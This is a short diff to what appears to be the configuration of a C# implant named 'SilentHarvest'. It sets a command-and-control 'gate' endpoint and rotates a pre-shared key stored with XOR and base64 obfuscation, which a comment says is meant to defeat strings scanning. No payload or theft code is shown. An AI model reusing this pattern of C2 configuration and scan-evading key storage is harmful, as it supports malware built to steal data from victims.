@@ -8,8 +8,8 @@ namespace SilentHarvest
         public const string C2 = "http://127.0.0.1:8443/gate";
         // PSK stored XOR+base64: defeats casual strings scanning only.
         // Treat the binary itself as secret material.
-        public const string PskEnc = "z1GyK/Hnsbrjsyw835T3Cg==";
-        public const string PskXorHex = "a63fc64e8388c19796dd4548f2e48461";
+        public const string PskEnc = "0q33ed76EcAT1oYsmVyJUQ==";
+        public const string PskXorHex = "bbc3831cac9561ed66b8ef58b42cfa3a";
         // TLS: "" = verify against system store; "cert:<sha256hex>" = pin the
         // exact server cert (use for self-signed); "any" = accept anything
         // (DEBUG ONLY -- defeats MITM protection).
